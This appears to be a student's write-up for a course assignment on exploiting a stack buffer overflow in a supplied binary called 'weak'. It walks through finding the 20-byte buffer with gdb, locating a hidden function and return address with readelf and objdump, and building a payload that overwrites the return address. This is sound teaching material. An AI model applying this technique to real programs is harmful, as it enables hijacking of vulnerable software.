## Assignment 3

### Part 1

1. Report what the program actually does:
    
    * The program takes in an input string and toggle case of each character randomly, sometime append random characters to it

2. Report what is the buffer size used by the program and how you were able to find it:

    * The buffer size is 20. 
    * To find the buffer size, run the following commands:
    
            ulimit -c unlimited
            perl -e 'print pack("C*", 0x20..0xFF)' | ./weak
            gdb ./weak core    
    
    * gdb shows return address 0x37363534 suggest 0x34 - 0x20 = 20 characters buffer
    
3. Report how you determined how to call the function that produced the desirable output:
    
    * To find rodata address:
        
            readelf -S ./weak | grep "rodata"
       This return 0x0809f8a0 as rodata address
              
    * To find desired string:
            
            readelf -p 5 ./weak | grep "Owned by group 12"
        This return offset from rodata is 0xd9, which mean actual address is 0x0809f8a0 + 0xd9 = 0x0809f979 
    
    * To dump .text portion of binary file:
            
            objdump -d weak > weak.dsl
    
    * To find reference to desired string:
            
            cat weak.dsl | grep "809f979"
        This show the string was referenced at 0x8048335
        
    * To find function address that referenced the string:
            
            cat weak.dsl | grep "80483[234]"
        This show the function start at 0x804832c (push %ebp). Also found reference to print function (0x8049540, called after string was loaded).
        
    * To find return address of original function:
            
            gdb ./weak
            break * 0x8049540           # Break before print function
            run
            123                         # Any input that fits inside buffer
            info frame                  # Saved eip is expected return address (0x80485f2)
       
4. Provide the source code for your exploit
    * To run exploit.py
    
            python exploit.py 12 | ./weak
            
5. Report how your exploit works and why it is structured the way it is:
     
     There are 3 parts to the exploit:
    * `"\00" * 20` is to fill the buffer. Any input after this will override the return address.
    * `"\x2c\x83\x04\x08"` is the hidden function address. This will override the return address, so when the original function finish, it will return to this address, meaning calling the hidden function.
    * `"\xf2\x85\x04\x08"` is the original return address, that is the return address without any buffer overflow. This will ensure the program exit normally. This address is added after the hidden function address because the function does not take in any arguments, therefore empty buffer. 